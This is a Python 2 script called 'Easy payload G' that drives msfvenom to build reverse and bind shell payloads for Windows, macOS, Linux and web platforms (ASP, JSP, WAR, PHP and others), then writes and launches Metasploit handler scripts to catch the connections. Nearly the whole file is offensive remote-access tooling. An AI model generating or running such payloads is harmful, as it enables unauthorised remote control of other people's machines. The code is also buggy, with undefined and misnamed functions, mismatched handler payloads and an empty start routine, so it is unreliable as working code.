#!/usr/bin/python

#@@@@@@@@@@@@@@@@@@@@@@@@@
#
# Easy payload G
# This application requires metasploit to be installed.
# Created by OPE (Other Peoples Enemy)
# 
#
#@@@@@@@@@@@@@@@@@@@@@@@@@


import subprocess
import os
import time

def meta_path():

	#figure out metasploit path
	trigger = 0
	try:

		if os.path.isfile("/opt/metasploit-framework/bin/msfconsole"):
			if trigger == 0:
				msf_path = "/opt/metasploit-framework/bin/"
				trigger = 1

		if os.path.isfile("/usr/bin/msfconsole"):
			if trigger == 0:
				msf_path = "/usr/bin/"
				trigger = 1

		if os.path.isfile("/opt/metasploit-framework/msfconsole"):
			if trigger == 0:
				msf_path = "/opt/metasploit-framework/"
				trigger = 1

 		if os.path.isfile("/opt/metasploit/apps/pro/msf3/msfconsole"):
			if trigger == 0:
				msf_path = ""
				trigger = 1

		if trigger == 0:
			print_error(
                "Metasploit path not found. These payloads will be disabled.")
			msf_path = False

	except Exception as e:
		print_status("Something went wrong:" + str(e))
	return msf_path
#metasploit reverse tcp payload generation command
msf_path = meta_path()
def meta_reverse_exe():
	ip = raw_input("what is the Connect Back IP: ")
	port = raw_input("what is the LOCAL port: ")
	subprocess.Popen(msf_path + 'msfvenom -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f exe > metareverse.exe'.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload metareverse.exe being Generated")
	time.sleep (1)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
		file = open("listener.rc","w")
		file.write("use exploit/multi/handler\n")
		file.write("set payload windows/meterpreter/reverse_tcp\n")
		file.write("set lhost {0}\n".format(ip))
		file.write("set lport {0}\n".format(port))
		file.write("set ExitOnSession false\n")
		file.write("exploit -j\r\n\r\n")
		file.close()
		print ("Launching Metasploit.....")
		subprocess.Popen (msf_path + "msfconsole -r listener.rc",shell=True).wait()
	elif listener == "n" or listener == "no":
		start()


#metasploit reverse tcp dll
def meta_reverse_dll():
	ip = raw_input("What is the Connect Back IP: ")
	port = raw_input("What is the Listening Port: ")
	subprocess.Popen(msf_path + 'msfvenom -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f dll > metareverse.dll'.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload metareverse.dll Being Generated")
	time.sleep (1)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
		file = open("listener.rc","w")
		file.write("use exploit/multi/handler\n")
		file.write("set payload windows/meterpreter/reverse_tcp\n")
		file.write("set lhost {0}\n".format(ip))
		file.write("set lport {0}\n".format(port))
		file.write("set ExitOnSession false\n")
		file.write("exploit -j\r\n\r\n")
		file.close()
		print ("Launching Metasploit.....")
		subprocess.Popen (msf_path + "msfconsole -r listener.rc",shell=True).wait()
	elif listener == "n" or listener == "no":
		start()


def meta_bind_exe():
	ip = raw_input("What is the Remote Host IP: ")
	port = raw_input ("What is the Remote Port IP: ")
	subprocess.Popen(msf_path + 'msfvenom -p windows/meterpreter/bind_tcp RHOST={0} LPORT={1} -f exe > metabind.exe '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload Metabind.exe Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
		file = open("listener.rc","w")
		file.write("use exploit/multi/handler\n")
		file.write("set payload windows/meterpreter/bind_tcp\n")
		file.write("set rhost {0}\n".format(ip))
		file.write("set lport {0}\n".format(port))
		file.write("set ExitOnSession false\n")
		file.write("exploit -j\r\n\r\n")
		file.close()
		print ("Launching Metasploit.....")
		subprocess.Popen (msf_path + "msfconsole -r listener.rc",shell=True).wait()
	elif listener == "n" or listener == "no":
		start()


def meta_bind_dll():
	ip = raw_input("What is the Remote Host IP: ")
	port = raw_input ("What is the Remote Port IP: ")
	subprocess.Popen(msf_path + 'msfvenom -p windows/meterpreter/bind_tcp RHOST={0} LPORT={1} -f dll > metabind.dll '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload Metabind.dll Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
		file = open("listener.rc","w")
		file.write("use exploit/multi/handler\n")
		file.write("set payload windows/meterpreter/reverse_tcp\n")
		file.write("set rhost {0}\n".format(ip))
		file.write("set lport {0}\n".format(port))
		file.write("set ExitOnSession false\n")
		file.write("exploit -j\r\n\r\n")
		file.close()
		print ("Launching Metasploit.....")
		subprocess.Popen (msf_path + "msfconsole -r listener.rc",shell=True).wait()
	elif listener == "n" or listener == "no":
		start()

def powershell_bind():
	ip = raw_input("What is the Remote IP: ")
	port = raw_input("What is the Remote Port: ")
	subprocess.Popen(msf_path + 'msfvenom -p windows/x64/powershell_bind_tcp RHOST={0} LPORT={1} > powerbind.bat'.format (ip,port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload powerbind.bat Being Generated")
	time.sleep(2)
	listener = raw_input ("Would you like to start metasploit listener")
	if listener == "y" or listener == "yes":
		file = open("listener.rc","w")
		file.write("use exploit/multi/handler\n")
		file.write("set payload windows/x64/powershell_bind_tcp\n")
		file.write("set rhost {0}\n".format(ip))
		file.write("set lport {0}\n".format(port))
		file.write("set ExitOnSession false\n")
		file.write("exploit -j\r\n\r\n")
		file.close()
		print ("Launching Metasploit.....")
		subprocess.Popen (msf_path + "msfconsole -r listener.rc",shell=True).wait()
	elif listener == "n" or listener == "no":
		start()


def powershell_reverse():
	ip = raw_input("What is the LOCAL Host IP: ")
	port = raw_input ("What is the LOCAL Port: ")
	subprocess.Popen(msf_path + 'msfvenom -p windows/x64/powershell_reverse_tcp LHOST={0} LPORT={1} > powerreverse.bat '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload powerreverse.bat Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
		file = open("listener.rc","w")
		file.write("use exploit/multi/handler\n")
		file.write("set payload windows/x64/powershell_reverse_tcp\n")
		file.write("set lhost {0}\n".format(ip))
		file.write("set lport {0}\n".format(port))
		file.write("set ExitOnSession false\n")
		file.write("exploit -j\r\n\r\n")
		file.close()
		print ("Launching Metasploit.....")
		subprocess.Popen (msf_path + "msfconsole -r listener.rc",shell=True).wait()
	elif listener == "n" or listener == "no":
		start()

def  powershell_cmd_bind():
	ip = raw_input("What is the Remote Host IP: ")
	port = raw_input ("What is the Remote Port: ")
	subprocess.Popen(msf_path + 'msfvenom -p cmd/windows/powershell_bind_tcp RHOST={0} LPORT={1} > powerbind-cmd.bat '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload powerbind-cmd.bat Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
		file = open("listener.rc","w")
		file.write("use exploit/multi/handler\n")
		file.write("set payload windows/x64/powershell_reverse_tcp\n")
		file.write("set rhost {0}\n".format(ip))
		file.write("set lport {0}\n".format(port))
		file.write("set ExitOnSession false\n")
		file.write("exploit -j\r\n\r\n")
		file.close()
		print ("Launching Metasploit.....")
		subprocess.Popen (msf_path + "msfconsole -r listener.rc",shell=True).wait()
	elif listener == "n" or listener == "no":
		start()


def powershell_cmd_reverse():
		ip = raw_input("What is the LOCAL Host IP: ")
		port = raw_input ("What is the LOCAL Port: ")
		subprocess.Popen(msf_path + 'msfvenom -p cmd/windows/powershell_reverse_tcp LHOST={0} LPORT={1} > powerreverse-cmd.bat '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		print ("Payload powerreverse-cmd.bat Being Generated")
		time.sleep (2)
		listener = raw_input ("Would you like to start Metasploit listener?: ")
		if listener == "y" or listener == "yes":
			file = open("listener.rc","w")
			file.write("use exploit/multi/handler\n")
			file.write("set payload windows/x64/powershell_reverse_tcp\n")
			file.write("set rhost {0}\n".format(ip))
			file.write("set lport {0}\n".format(port))
			file.write("set ExitOnSession false\n")
			file.write("exploit -j\r\n\r\n")
			file.close()
			print ("Launching Metasploit.....")
			subprocess.Popen (msf_path + "msfconsole -r listener.rc",shell=True).wait()
		elif listener == "n" or listener == "no":
			start()

def windows_payloads():
	os.system("clear")
	print ("\n")
 	print(
	""" _    _ _           _""")
	print(
	"""| |  | (_)         | | """)
	print(
	"""| |  | |_ _ __   __| | _____      _____""")
	print(
	"""| |/\| | | '_ \ / _` |/ _ \ \ /\ / / __|""")
	print(
	"""\  /\  / | | | | (_| | (_) \ V  V /\__ \ """)
	print(
 	""" \/  \/|_|_| |_|\__,_|\___/ \_/\_/ |___/ """)
	print ("\n")
	print (" 1 Windows Metasploit Reverse exe")
	print (" 2 Windows Metasploit Revese DLL")
	print (" 3 Windows Metasploit Bind exe")
	print (" 4 Windows Metaasploit Bind DLL")
 	print (" 5 Windows Powershell X64 Bind ")
	print (" 6 Windows Powershell X64 Reverse ")
	print (" 7 Windows Powershell cmd Bind ")
	print (" 8 Windows Powershell cmd Reverse")
	print (" back to Go Back")
	print (" 99 Exit")
	payload = raw_input ("Select Payload: ")

	if payload == "1":
		meta_reverse_exe()
	elif payload == "2":
		meta_reverse_dll()
	elif payload == "3":
		meta_bind_exe()
	elif payload == "4":
		meta_bind_dll()
	elif payload == "5":
		powershell_bind()
	elif payload == "6":
		powershell_reverse()
	elif payload == "7":
		powershell_cmd_bind()
	elif payload == "8":
		powershell_reverse()
	elif payload == "99":
		quit()
	elif payload == "back":
		start()
	else:
		windows_payloads()


#OSX payload section
def osx_reverse_x64_meta():
	ip = raw_input("What is the LOCAL Host IP: ")
	port = raw_input ("What is the LOCAL Port: ")
	subprocess.Popen(msf_path + 'msfvenom -p osx/x64/meterpreter/reverse_tcp  LHOST={0} LPORT={1} -f macho > osx-reverse_meta.macho '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload osx-reverse.macho Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
		file = open("listener.rc","w")
		file.write("use exploit/multi/handler\n")
		file.write("set payload osx/x64/meterpreter/reverse_tcp\n")
		file.write("set lhost {0}\n".format(ip))
		file.write("set lport {0}\n".format(port))
		file.write("set ExitOnSession false\n")
		file.write("exploit -j\r\n\r\n")
		file.close()
		print ("Launching Metasploit.....")
		subprocess.Popen (msf_path + "msfconsole -r listener.rc",shell=True).wait()
	elif listener == "n" or listener == "no":
		start()

def osx_bind_x64_meta():
	ip = raw_input("What is the Remote Host IP: ")
	port = raw_input ("What is the Remote Port: ")
	subprocess.Popen(msf_path + 'msfvenom -p osx/x64/meterpreter/bind_tcp  RHOST={0} LPORT={1} -f macho > osx-bind_meta.macho '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload osx-bind.macho Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
		file = open("listener.rc","w")
		file.write("use exploit/multi/handler\n")
		file.write("set payload osx/x64/meterpreter/bind_tcp\n")
		file.write("set lhost {0}\n".format(ip))
		file.write("set lport {0}\n".format(port))
		file.write("set ExitOnSession false\n")
		file.write("exploit -j\r\n\r\n")
		file.close()
		print ("Launching Metasploit.....")
		subprocess.Popen (msf_path + "msfconsole -r listener.rc",shell=True).wait()
	elif listener == "n" or listener == "no":
		start()

def osx_reverse_nometa():
	ip = raw_input("What is the LOCAL Host IP: ")
	port = raw_input ("What is the LOCAL Port: ")
	subprocess.Popen(msf_path + 'msfvenom -p osx/x86/shell_reverse_tcp  LHOST={0} LPORT={1} -f macho > osx-reverse.macho '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload osx-reverse.macho Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
		file = open("listener.rc","w")
		file.write("use exploit/multi/handler\n")
		file.write("set payload osx/x86/shell_reverse_tcp\n")
		file.write("set lhost {0}\n".format(ip))
		file.write("set lport {0}\n".format(port))
		file.write("set ExitOnSession false\n")
		file.write("exploit -j\r\n\r\n")
		file.close()
		print ("Launching Metasploit.....")
		subprocess.Popen (msf_path + "msfconsole -r listener.rc",shell=True).wait()
	elif listener == "n" or listener == "no":
		start()

def osx_reverse_meter_https():
	ip = raw_input("What is the LOCAL Host IP: ")
	port = raw_input ("What is the LOCAL Port: ")
	subprocess.Popen(msf_path + 'msfvenom -p osx/x64/meterpreter_reverse_https  LHOST={0} LPORT={1} -f macho > osx-reverse_https.macho '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload osx-reverse_https.macho Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
		file = open("listener.rc","w")
		file.write("use exploit/multi/handler\n")
		file.write("set payload osx/x64/meterpreter_reverse_https\n")
		file.write("set lhost {0}\n".format(ip))
		file.write("set lport {0}\n".format(port))
		file.write("set ExitOnSession false\n")
		file.write("exploit -j\r\n\r\n")
		file.close()
		print ("Launching Metasploit.....")
		subprocess.Popen (msf_path + "msfconsole -r listener.rc",shell=True).wait()
	elif listener == "n" or listener == "no":
		start()

def linux_payloads():
	os.system("clear")
	print(
 	 """_      _""")
	print(
	"""| |    (_)""")
	print(
	"""| |     _ _ __  _   ___  __""")
	print(
	"""| |    | | '_ \| | | \ \/ /""")
	print(
	"""| |____| | | | | |_| |>  <""")
	print(
	"""|______|_|_| |_|\__,_/_/\_\ """)
	print("\n")
	print (" 1 Linux Meterpreter Reverse TCP")
	print (" 2 Linux Meterpreter Bind")
	print (" 3 Linux Revese Shell ")
	print (" 4 Linux Bind Shell")
	print (" 5 Linux X64 Reverse Shell")
	print (" 6 Linux X64 Bind Shell")
	print ("back to go back")
	print ("99 to exit")
	linux_payload = raw_input ("Select Payload: ")
	if linux_payload == "1":
		linux_meter_reverse()
	elif linux_payload == "2":
		linux_meter_bind()
	elif linux_payload == "3":
		linux_reverse()
	elif linux_payload == "4":
		linux_bind()
	elif linux_payload == "5":
		linux_x64_reverse()
	elif linux_payload == "6":
		linux_x64_bind()
	elif linux_payload == "back":
		start()
	elif linux_payload == "99":
		quit()



def linux_meter_reverse():
	ip = raw_input("What is the LOCAL Host IP: ")
	port = raw_input ("What is the LOCAL Port: ")
	subprocess.Popen('msfvenom -p  linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f elf > linux_meta_reverse.elf '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload linux_meta_reverse.elf Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
		file = open("listener.rc","w")
		file.write("use exploit/multi/handler\n")
		file.write("set payload linux/x86/meterpreter/reverse_tcp\n")
		file.write("set lhost {0}\n".format(ip))
		file.write("set lport {0}\n".format(port))
		file.write("set ExitOnSession false\n")
		file.write("exploit -j\r\n\r\n")
		file.close()
		print ("Launching Metasploit.....")
		subprocess.Popen (msf_path + "msfconsole -r listener.rc",shell=True).wait()
	elif listener == "n" or listener == "no":
		start()


def linux_meter_bind():
	ip = raw_input("What is the Remote Host IP: ")
	port = raw_input ("What is the Remote Port: ")
	subprocess.Popen(msf_path + 'msfvenom -p  linux/x86/meterpreter/bind_tcp LHOST={0} LPORT={1} -f elf > linux_meta_reverse.elf '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload linux_meta_reverse.elf Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
		file = open("listener.rc","w")
		file.write("use exploit/multi/handler\n")
		file.write("set payload linux/x86/meterpreter/bind_tcp\n")
		file.write("set rhost {0}\n".format(ip))
		file.write("set lport {0}\n".format(port))
		file.write("set ExitOnSession false\n")
		file.write("exploit -j\r\n\r\n")
		file.close()
		print ("Launching Metasploit.....")
		subprocess.Popen (msf_path + "msfconsole -r listener.rc",shell=True).wait()
	elif listener == "n" or listener == "no":
		start()


def linux_reverse():
	ip = raw_input("What is the Local Host IP: ")
	port = raw_input ("What is the Local Port: ")
	subprocess.Popen(msf_path + 'msfvenom -p   linux/x86/shell/reverse_tcp LHOST={0} LPORT={1} -f elf > linux_meta_reverse.elf '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload linux_meta_reverse.elf Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
		file = open("listener.rc","w")
		file.write("use exploit/multi/handler\n")
		file.write("set payload linux/x86/shell/reverse_tcp\n")
		file.write("set lhost {0}\n".format(ip))
		file.write("set lport {0}\n".format(port))
		file.write("set ExitOnSession false\n")
		file.write("exploit -j\r\n\r\n")
		file.close()
		print ("Launching Metasploit.....")
		subprocess.Popen (msf_path + "msfconsole -r listener.rc",shell=True).wait()
	elif listener == "n" or listener == "no":
		start()



def linux_bind():
	ip = raw_input("What is the Remote Host IP: ")
	port = raw_input ("What is the Remote Port: ")
	subprocess.Popen(msf_path + 'msfvenom -p   linux/x86/shell/bind_tcp LHOST={0} LPORT={1} -f elf > linux_meta_reverse.elf '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload linux_meta_reverse.elf Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
		file = open("listener.rc","w")
		file.write("use exploit/multi/handler\n")
		file.write("set payload linux/x86/shell/bind_tcp\n")
		file.write("set rhost {0}\n".format(ip))
		file.write("set lport {0}\n".format(port))
		file.write("set ExitOnSession false\n")
		file.write("exploit -j\r\n\r\n")
		file.close()
		print ("Launching Metasploit.....")
		subprocess.Popen (msf_path + "msfconsole -r listener.rc",shell=True).wait()
	elif listener == "n" or listener == "no":
		start()


def linux_x64_reverse():
	ip = raw_input("What is the Local Host IP: ")
	port = raw_input ("What is the Local Port: ")
	subprocess.Popen(msf_path + 'msfvenom -p   linux/x64/shell/reverse_tcp LHOST={0} LPORT={1} -f elf > linux_meta_reverse.elf '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload linux_meta_reverse.elf Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
		file = open("listener.rc","w")
		file.write("use exploit/multi/handler\n")
		file.write("set payload linux/x64/shell/reverse_tcp\n")
		file.write("set lhost {0}\n".format(ip))
		file.write("set lport {0}\n".format(port))
		file.write("set ExitOnSession false\n")
		file.write("exploit -j\r\n\r\n")
		file.close()
		print ("Launching Metasploit.....")
		subprocess.Popen (msf_path + "msfconsole -r listener.rc",shell=True).wait()
	elif listener == "n" or listener == "no":
		start()



def linux_x64_bind():
	ip = raw_input("What is the Remote Host IP: ")
	port = raw_input ("What is the Remote Port: ")
	subprocess.Popen(msf_path + 'msfvenom -p   linux/x64/shell/bind_tcp LHOST={0} LPORT={1} -f elf > linux_meta_reverse.elf '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload linux_meta_reverse.elf Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
		file = open("listener.rc","w")
		file.write("use exploit/multi/handler\n")
		file.write("set payload linux/x86/shell/bind_tcp\n")
		file.write("set rhost {0}\n".format(ip))
		file.write("set lport {0}\n".format(port))
		file.write("set ExitOnSession false\n")
		file.write("exploit -j\r\n\r\n")
		file.close()
		print ("Launching Metasploit.....")
		subprocess.Popen (msf_path + "msfconsole -r listener.rc",shell=True).wait()
	elif listener == "n" or listener == "no":
		start()


def asp_payload():
	ip = raw_input("What is the Local Host IP: ")
	port = raw_input ("What is the Local Port: ")
	subprocess.Popen(msf_path + 'msfvenom -p   windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f asp > reverse.asp '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload reverse.asp Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
		file = open("listener.rc","w")
		file.write("use exploit/multi/handler\n")
		file.write("set payload windows/meterpreter/reverse_tcp\n")
		file.write("set lhost {0}\n".format(ip))
		file.write("set lport {0}\n".format(port))
		file.write("set ExitOnSession false\n")
		file.write("exploit -j\r\n\r\n")
		file.close()
		print ("Launching Metasploit.....")
		subprocess.Popen (msf_path + "msfconsole -r listener.rc",shell=True).wait()
	elif listener == "n" or listener == "no":
		start()


def jsp_payload():
	ip = raw_input("What is the Local Host IP: ")
	port = raw_input ("What is the Local Port: ")
	subprocess.Popen(msf_path + 'msfvenom -p   java/jsp_shell_reverse_tcp LHOST={0} LPORT={1} -f raw  > reverse.jsp '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload reverse.jsp Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
		file = open("listener.rc","w")
		file.write("use exploit/multi/handler\n")
		file.write("set payload java/jsp_shell_reverse_tcp\n")
		file.write("set lhost {0}\n".format(ip))
		file.write("set lport {0}\n".format(port))
		file.write("set ExitOnSession false\n")
		file.write("exploit -j\r\n\r\n")
		file.close()
		print ("Launching Metasploit.....")
		subprocess.Popen (msf_path + "msfconsole -r listener.rc",shell=True).wait()
	elif listener == "n" or listener == "no":
		start()


def war_payload():
	ip = raw_input("What is the Local Host IP: ")
	port = raw_input ("What is the Local Port: ")
	subprocess.Popen(msf_path + 'msfvenom -p   java/jsp_shell_reverse_tcp LHOST={0} LPORT={1} -f war  > reverse.war '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload reverse.jsp Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
		file = open("listener.rc","w")
		file.write("use exploit/multi/handler\n")
		file.write("set payload java/jsp_shell_reverse_tcp\n")
		file.write("set lhost {0}\n".format(ip))
		file.write("set lport {0}\n".format(port))
		file.write("set ExitOnSession false\n")
		file.write("exploit -j\r\n\r\n")
		file.close()
		print ("Launching Metasploit.....")
		subprocess.Popen (msf_path + "msfconsole -r listener.rc",shell=True).wait()
	elif listener == "n" or listener == "no":
		start()


def pthon_payload():
	ip = raw_input("What is the Local Host IP: ")
	port = raw_input ("What is the Local Port: ")
	subprocess.Popen('msfvenom -p   cmd/unix/reverse_python LHOST={0} LPORT={1} -f raw  > reverse.py '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload reverse.py Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
		file = open("listener.rc","w")
		file.write("use exploit/multi/handler\n")
		file.write("set payload cmd/unix/reverse_python\n")
		file.write("set lhost {0}\n".format(ip))
		file.write("set lport {0}\n".format(port))
		file.write("set ExitOnSession false\n")
		file.write("exploit -j\r\n\r\n")
		file.close()
		print ("Launching Metasploit.....")
		subprocess.Popen (msf_path + "msfconsole -r listener.rc",shell=True).wait()
	elif listener == "n" or listener == "no":
		start()


def perl_payload():
	ip = raw_input("What is the Local Host IP: ")
	port = raw_input ("What is the Local Port: ")
	subprocess.Popen(msf_path + 'msfvenom -p   cmd/unix/reverse_perl LHOST={0} LPORT={1} -f raw  > reverse.pl '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload reverse.pl Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
		file = open("listener.rc","w")
		file.write("use exploit/multi/handler\n")
		file.write("set payload cmd/unix/reverse_perl\n")
		file.write("set lhost {0}\n".format(ip))
		file.write("set lport {0}\n".format(port))
		file.write("set ExitOnSession false\n")
		file.write("exploit -j\r\n\r\n")
		file.close()
		print ("Launching Metasploit.....")
		subprocess.Popen (msf_path + "msfconsole -r listener.rc",shell=True).wait()
	elif listener == "n" or listener == "no":
		start()

def nodjs_payload():
	ip = raw_input("What is the Local Host IP: ")
	port = raw_input ("What is the Local Port: ")
	subprocess.Popen(msf_path + 'msfvenom -p nodjs/shell_reverse_tcp LHOST={0} LPORT={1} -f js  > reverse.js '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload reverse.js Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
		file = open("listener.rc","w")
		file.write("use exploit/multi/handler\n")
		file.write("set payload nodjs/shell_reverse_tcp\n")
		file.write("set lhost {0}\n".format(ip))
		file.write("set lport {0}\n".format(port))
		file.write("set ExitOnSession false\n")
		file.write("exploit -j\r\n\r\n")
		file.close()
		print ("Launching Metasploit.....")
		subprocess.Popen (msf_path + "msfconsole -r listener.rc",shell=True).wait()
	elif listener == "n" or listener == "no":
		start()

def java_payload():
	ip = raw_input("What is the Local Host IP: ")
	port = raw_input ("What is the Local Port: ")
	subprocess.Popen(msf_path + 'msfvenom -p java/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f js  > reverse.js '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload reverse.js Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
		file = open("listener.rc","w")
		file.write("use exploit/multi/handler\n")
		file.write("set payload java/meterpreter/reverse_tcp\n")
		file.write("set lhost {0}\n".format(ip))
		file.write("set lport {0}\n".format(port))
		file.write("set ExitOnSession false\n")
		file.write("exploit -j\r\n\r\n")
		file.close()
		print ("Launching Metasploit.....")
		subprocess.Popen (msf_path + "msfconsole -r listener.rc",shell=True).wait()
	elif listener == "n" or listener == "no":
		start()



def php_payload():
	ip = raw_input("What is the Local Host IP: ")
	port = raw_input ("What is the Local Port: ")
	subprocess.Popen(msf_path + 'msfvenom -p php/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f js  > reverse.js '.format (ip, port),stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	print ("Payload reverse.js Being Generated")
	time.sleep (2)
	listener = raw_input ("Would you like to start Metasploit listener?: ")
	if listener == "y" or listener == "yes":
		file = open("listener.rc","w")
		file.write("use exploit/multi/handler\n")
		file.write("set payload php/meterpreter/reverse_tcp\n")
		file.write("set lhost {0}\n".format(ip))
		file.write("set lport {0}\n".format(port))
		file.write("set ExitOnSession false\n")
		file.write("exploit -j\r\n\r\n")
		file.close()
		print ("Launching Metasploit.....")
		subprocess.Popen (msf_path + "msfconsole -r listener.rc",shell=True).wait()
	elif listener == "n" or listener == "no":
		start()





def other_payloads():
	os.system("clear")
	print ("\n")
	print (
""" ____   _   _                 _____            _                 _""")
	print (
 """/ __ \ | | | |               |  __ \          | |               | |""")
 	print(
 """| |  | | |_| |__   ___ _ __  | |__) |_ _ _   _| | ___   __ _  __| |""")
 	print(
"""| |  | | __| '_ \ / _ \ '__| |  ___/ _` | | | | |/ _ \ / _` |/ _` |""")
	print(
"""| |__| | |_| | | |  __/ |    | |  | (_| | |_| | | (_) | (_| | (_| |""")
	print(
 """\____/ \__|_| |_|\___|_|     |_|   \__,_|\__, |_|\___/ \__,_|\__,_|""")
 	print(
"""                                          __/ |""")
	print(
"""                                         |___/""" )
	print ( " 1 ASP Reverse Meterpreter Payloads")
	print ( " 2 War Reverse Meterpreter Payload")
	print (" 3 JSP Reverse Payload")
	print (" 4 Python Payload ")
	print (" 5 Perl Payload")
	print (" 6 nodejs Reverse Meterpreter  ")
	print (" 7 Java Reverse Meterpreter")
	print (" 8 PHP Reverse Meterpreter")
	print (" 99 Exit")
	print (" back to go back")
	otherpayload = raw_input (" Please Select a Payload: ")
	if otherpayload == "1":
		asp_payload()
	elif otherpayload == "2":
		war_payload()
	elif otherpayload == "3":
		jsp_payload
	elif otherpayload == "4":
		python_payload()
	elif otherpayload == "5":
		perl_payload()
	elif otherpayload == "6":
		nodjs_payload()
	elif otherpayload == "7":
		java_payload()
	elif otherpayload == "8":
		php_payload()
	elif otherpayload == "back":
		start()
	elif otherpayload == "99":
		quit()
	else:
		other_payloads()



def osx_payloads():
	os.system("clear")
	print ("\n")
	print (
""" ____   _______   __""")
	print(
 """/ __ \ / ____ \ \ / / """)
 	print(
"""| |  | | (___  \ V / """)
 	print(
"""| |  | |\___ \  > < """)
  	print(
"""| |__| |____) |/ . \ """)
	print(
 """\____/|_____/ /_/ \_\ """)
 	print("\n")
 	print (" 1 OSX X64 Meterpreter Reverse TCP")
	print (" 2 OSX X64 Meterpreter Bind TCP")
	print (" 3 OSX reverse command shell")
	print (" 4 OSX reverse Meterpreter HTTPS")
	print (" 99 Exit ")
	print (" back to go back")
	osx_payload = raw_input ("Select Payload: ")

	if osx_payload == "1":
			osx_reverse_x64_meta()
	elif osx_payload == "2":
			osx_bind_x64_meta()
	elif osx_payload == "3":
			osx_reverse_nometa()
	elif osx_payload == "4":
			osx_reverse_meter_https()
	elif osx_payload == "back":
		     start()
	elif	osx_payload == "99":
			 quit()
	else:
		osx_payloads()


def start():
	#clear screen
	os.system("clear")
